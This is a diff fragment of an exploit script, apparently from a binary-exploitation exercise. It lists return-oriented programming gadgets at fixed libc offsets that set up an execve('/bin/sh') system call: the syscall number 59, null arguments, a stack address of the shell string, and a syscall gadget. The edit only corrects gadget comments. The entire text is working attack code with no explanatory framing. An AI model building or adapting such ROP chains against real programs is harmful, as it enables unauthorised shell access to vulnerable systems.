@@ -8,9 +8,9 @@ import binascii
 LIBC_OFFSET = 0x7ffff7a3a000
 g1 = LIBC_OFFSET + 0xe76fa # pop rax ; ret
 d1 = 59
-g2 = LIBC_OFFSET + 0xf54f9 #pop rdx + rsi
+g2 = LIBC_OFFSET + 0xf54f9 #pop rdx ; pop rsi ; ret
 d2 = 0x00
-g3 = LIBC_OFFSET + 0x1fc6a  #= pop rdi
+g3 = LIBC_OFFSET + 0x1fc6a  # pop rdi ; ret
 d4 = 0x7fffffffe154 #address of /bin/sh on the stack
 retStringRev = 0x0068732f6e69622f
 g4 = 0x7ffff7b9476b #syscall
